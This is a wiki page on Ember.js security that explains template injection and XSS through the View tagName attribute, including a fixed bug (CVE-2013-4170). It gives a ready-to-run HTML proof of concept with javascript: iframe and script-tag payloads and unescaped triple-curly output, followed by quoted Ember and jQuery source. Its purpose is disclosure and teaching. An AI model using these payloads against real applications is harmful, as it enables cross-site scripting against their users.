#summary Ember.js security, XSS and injections

<wiki:toc max_depth="2" />

= Introduction =

"Write dramatically less code with Ember's Handlebars integrated templates that update automatically when the underlying data changes.

Don't waste time making trivial choices. Ember.js incorporates common idioms so you can focus on what makes your app special, not reinventing the wheel.

Ember.js is built for productivity. Designed with developer ergonomics in mind, its friendly APIs help you get your job doneâ€”fast."

From http://emberjs.com/

= Quick Facts =

 * [http://builds.emberjs.com/ember-1.0.0-rc.6.1.js Ember.js 1.0.0-rc.6.1 (Uncompressed)]
 * Usage Stats http://trends.builtwith.com/javascript/Ember
 * Dedicated Security Program & response process http://emberjs.com/security/
 * Security Mailing-List https://groups.google.com/forum/#!forum/ember-security

= Injection Attacks =

Ember.js uses an advanced parser to validate the expressions a developer can use inside the usual curlies. Unlike frameworks such as AngularJS, Ember.js is not vulnerable against "sandbox"-escapes such as the `constructor`-trick.

Earlier versions were nevertheless vulnerable against a concatenation-based bug in the `tagName` attribute of the view element. The bug has been fixed in version 1.0.0-rc.6.1. The following "paste-and-go"-ready code example illustrates this issue. Furthermore, the `tagName` attribute can still be used for arbitrary script execution by simply creating a `<script>` element and filling the view with the !JavaScript code to execute.


== Attacks against View.tagName ==
 
{{{
<!doctype html>
<html>
<head>
  <script src="http://emberjs.com.s3.amazonaws.com/getting-started/jquery.min.js"></script>
  <script src="http://emberjs.com.s3.amazonaws.com/getting-started/handlebars.js"></script>
  <script src="http://builds.emberjs.com/ember-1.0.0-rc.6.js"></script>
  <script src="http://emberjs.com.s3.amazonaws.com/getting-started/ember-data.js"></script>
  <script src="http://emberjs.com.s3.amazonaws.com/getting-started/local_storage_adapter.js"></script>
  <script src="test.js"></script>
</head>
<body>
  <script type="text/x-handlebars" data-template-name="x">
  {{view tagName=[iframe src=javascript:123]}} <- fixed in 1.0.0-rc.6.1 (CVE-2013-4170)
  {{#view tagName=script}}alert(top){{/view}}
  {{#each controller}}{{{unsafe}}}{{/each}}
  </script>
</body>
}}}

== Script Execution via View.tagName ==

Ember.js calls its `appentTo()` method and thereby simply passes the dirty DOM-work over to jQuery (without Ember.js wouldn't run anyway). jQuery in its wisdom realizes that a `<script>` elements needs to be appended, parses its content and then evaluates this data.

{{{
appendTo: function(target) {
    this._insertElementLater(function() {
        Ember.assert("You cannot append to an existing Ember.View. Consider using Ember.ContainerView instead.", !Ember.$(target).is('.ember-view') && !Ember.$(target).parents().is('.ember-view'));
        this.$().appendTo(target);
    });
    return this;
}


[...]

// Evaluate executable scripts on first document insertion
for (i = 0; i < hasScripts; i++) {
    node = scripts[i];
    if (rscriptType.test(node.type || "") && 
        !jQuery._data(node, "globalEval") && jQuery.contains(doc, node)) {
                                
        if (node.src) {
            // Hope ajax is available...
            jQuery._evalUrl(node.src);
        } else {
            jQuery.globalEval((node.text || node.textContent || node.innerHTML || "").replace(rcleanScript, ""));
        }
    }
}
}}}